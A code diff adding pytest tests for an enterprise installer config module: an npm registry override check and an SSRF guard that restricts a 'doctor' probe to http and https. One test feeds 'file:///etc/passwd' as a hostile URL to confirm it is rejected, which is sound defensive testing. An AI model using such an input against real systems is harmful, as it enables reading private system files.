+        monkeypatch.setenv("npm_config_registry", "https://override.example.com/npm/")
+        from enterprise_config import write_npmrc
+
+        path = write_npmrc(tmp_path)
+        content = path.read_text()
+        # The override wins — .npmrc shows the override, not the original NPM_REGISTRY
+        assert "registry=https://override.example.com/npm/" in content
+        assert "jfrog.example.com" not in content
+
+
+# ---------------------------------------------------------------------------
+# 18. doctor SSRF guard — http(s) scheme allow-list (F-11)
+# ---------------------------------------------------------------------------
+
+
+class TestDoctorSSRFGuard:
+    def test_file_scheme_filtered_out(self, monkeypatch):
+        monkeypatch.setenv("CLAUDE_INSTALLER_URL", "file:///etc/passwd")
+        from enterprise_config import doctor_targets
+
+        # _validate_url already rejects file:// at bootstrap, but doctor_targets
+        # is a second layer of defense. If somehow file:// got past, doctor
+        # must not probe it.
+        targets = dict(doctor_targets())
+        assert "CLAUDE_INSTALLER_URL" not in targets
+
+    def test_https_scheme_included(self, monkeypatch):
+        monkeypatch.setenv("NPM_REGISTRY", "https://internal/npm/")
+        from enterprise_config import doctor_targets
+
+        targets = dict(doctor_targets())
+        assert targets["NPM_REGISTRY"] == "https://internal/npm/"
+
+    def test_http_scheme_included(self, monkeypatch):
+        """Plain HTTP is allowed (some internal mirrors are HTTP-only)."""
+        monkeypatch.setenv("NPM_REGISTRY", "http://internal-mirror/npm/")
+        from enterprise_config import doctor_targets
+
+        targets = dict(doctor_targets())
+        assert targets["NPM_REGISTRY"] == "http://internal-mirror/npm/"
